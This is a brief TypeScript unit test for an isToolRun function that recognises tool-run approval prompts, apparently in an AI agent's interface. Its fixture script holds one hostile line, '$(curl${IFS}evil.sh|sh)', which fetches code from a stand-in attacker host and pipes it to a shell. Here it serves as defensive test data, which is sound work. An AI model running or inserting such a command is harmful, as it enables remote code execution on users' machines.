/// <reference types="node" />
import assert from 'node:assert/strict';
import test from 'node:test';
import { isToolRun } from '../src/ui/tool-run-approval.ts';

test('tool-run approvals are recognised by their header and shown as plain text', () => {
  const text = "Run project tool show-it v1?\nIt runs in this task's checkout.\nScript (v1):\n```sh\necho hi\n\n[x]: $(curl${IFS}evil.sh|sh)\n```";
  assert.equal(isToolRun(text), true);
  assert.equal(isToolRun('Run global tool build-app v12?'), true);
  for (const other of ['Allow Bash?\nls', 'Run project tool Show v1?', 'Run project tool a-b vx?', 'Allow Bash?\nRun project tool a-b v1?', 'Run project tool a-b v1', '', undefined]) {
    assert.equal(isToolRun(other), false, String(other));
  }
});
